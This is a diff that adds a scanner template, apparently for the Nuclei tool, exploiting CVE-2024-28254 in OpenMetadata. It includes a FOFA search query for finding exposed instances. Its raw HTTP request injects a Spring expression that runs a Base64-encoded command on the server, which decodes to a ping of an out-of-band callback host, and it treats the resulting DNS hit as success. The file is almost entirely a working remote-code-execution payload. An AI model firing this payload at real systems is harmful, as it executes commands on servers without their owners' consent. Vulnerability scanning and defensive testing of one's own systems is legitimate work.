@@ -1,0 +1,25 @@
+id: openmetadata-command-execution
+info:
+  name: OpenMetadata 远程代码执行漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: title="OpenMetadata"
+  reference:
+  - CVE-2024-28254
+  tags: OpenMetadata
+http:
+- raw:
+  - |
+    GET /api/v1/events/subscriptions/validation/condition/T(java.lang.Runtime).getRuntime().exec(new%20java.lang.String(T(java.util.Base64).getDecoder().decode(%22cGluZyB7e2ludGVyYWN0c2gtdXJsfX0=%22))) HTTP/1.1
+    Host: {{Hostname}}
+    Authorization: Bearer token
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: interactsh_protocol
+    words:
+    - "dns"
